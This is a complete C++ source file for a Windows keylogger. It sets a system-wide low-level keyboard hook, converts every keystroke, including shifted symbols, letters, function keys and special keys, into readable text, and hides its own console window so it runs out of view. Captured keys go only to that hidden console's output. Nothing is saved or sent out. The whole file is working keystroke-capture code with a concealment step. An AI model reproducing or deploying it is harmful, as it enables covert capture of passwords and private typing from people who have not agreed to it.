#include <iostream>
#include <string>
#include <Windows.h>

using namespace std;

#define VK_0 0x30
#define VK_9 0x39
#define VK_A 0x41
#define VK_Z 0x5A

HHOOK keyboardHook;

char processDigit(int code) {
    char output;
    bool shiftEnabled = GetKeyState(VK_SHIFT);
    switch (code) {
        case 0x30:
            output = shiftEnabled ? ')' : '0';
            break;
        case 0x31:
            output = shiftEnabled ? '!' : '1';
            break;
        case 0x32:
            output = shiftEnabled ? '@' : '2';
            break;
        case 0x33:
            output = shiftEnabled ? '#' : '3';
            break;
        case 0x34:
            output = shiftEnabled ? '$' : '4';
            break;
        case 0x35:
            output = shiftEnabled ? '%' : '5';
            break;
        case 0x36:
            output = shiftEnabled ? '^' : '6';
            break;
        case 0x37:
            output = shiftEnabled ? '&' : '7';
            break;
        case 0x38:
            output = shiftEnabled ? '*' : '8';
            break;
        case 0x39:
            output = shiftEnabled ? '(' : '9';
            break;
        default:
            output = 0;
    }
    return output;
}

char processLetter(int code) {
    bool capsEnabled = (GetKeyState(VK_CAPITAL) & 0x00001) != 0;
    bool ctrlEnabled = GetAsyncKeyState(VK_LCONTROL) || GetAsyncKeyState(VK_RCONTROL) || GetAsyncKeyState(VK_CONTROL);

    if (char(tolower(code)) == 'q' && ctrlEnabled) {
        cout << "Exiting the program" << endl;
        exit(1);
    }

    if (!capsEnabled) {
        return char(tolower(code));
    } else {
        return (char) code;
    }
}

string processHelpKeys(int code) {
    string output;
    switch (code) {
        case VK_CAPITAL:
            output = "[CapsLock]";
            break;
        case VK_LCONTROL:
            output = "[Left Ctrl]";
            break;
        case VK_RCONTROL:
            output = "[Right Ctrl]";
            break;
        case VK_LSHIFT:
            output = "[Left Shift]";
            break;
        case VK_RSHIFT:
            output = "[Right Shift]";
            break;
        case VK_SHIFT:
            output = "[Shift]";
            break;
        case VK_INSERT:
            output = "[Insert]";
            break;
        case VK_END:
            output = "[End]";
            break;
        case VK_PRINT:
            output = "[Print]";
            break;
        case VK_DELETE:
            output = "[Delete]";
            break;
        case VK_BACK:
            output = "[Back]";
            break;
        case VK_LEFT:
            output = "[Left]";
            break;
        case VK_RIGHT:
            output = "[Right]";
            break;
        case VK_UP:
            output = "[Up]";
            break;
        case VK_DOWN:
            output = "[Down]";
            break;
        case VK_SPACE:
            output = "[Space]";
            break;
        case VK_ESCAPE:
            output = "[Esc]";
            break;
        case VK_TAB:
            output = "[Tab]";
            break;
        case VK_RETURN:
            output = "[Enter]";
            break;
        case 0xFF:
            output = "[Fn]";
            break;
        default:
            output = "[Unknown key] " + to_string(code);
    }
    return output;
}

LRESULT CALLBACK callback(int nCode, WPARAM wParam, LPARAM lParam) {
    if ((nCode == HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN))) {
        const KBDLLHOOKSTRUCT &key = *((KBDLLHOOKSTRUCT *) lParam);
        DWORD code = key.vkCode;
        if (code >= VK_0 && code <= VK_9) {
            cout << processDigit(code);
        } else if (code >= VK_A && code <= VK_Z) {
            cout << processLetter(code);
        } else if (code >= VK_F1 && code <= VK_F24) {
            cout << "[F" << code - 111 << "]";
        } else if (code) {
            cout << processHelpKeys(code);
        }
        cout << endl;
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

void processMessage() {
    MSG message;
    while (GetMessage(&message, nullptr, 0, 0)) {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }
}

DWORD WINAPI addHook(LPVOID _) {
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC) callback, nullptr, 0);
    processMessage();
    UnhookWindowsHookEx(keyboardHook);
    return 0;
}

int main() {
    HANDLE hThread;
    DWORD dwThread;

    printf("Press Ctrl + q to quit  \n");
    hThread = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE) addHook,
                           nullptr, 0, &dwThread);

    ShowWindow(FindWindowA("ConsoleWindowClass", nullptr), false);

    if (hThread) {
        return WaitForSingleObject(hThread, INFINITE);
    } else {
        return 1;
    }
}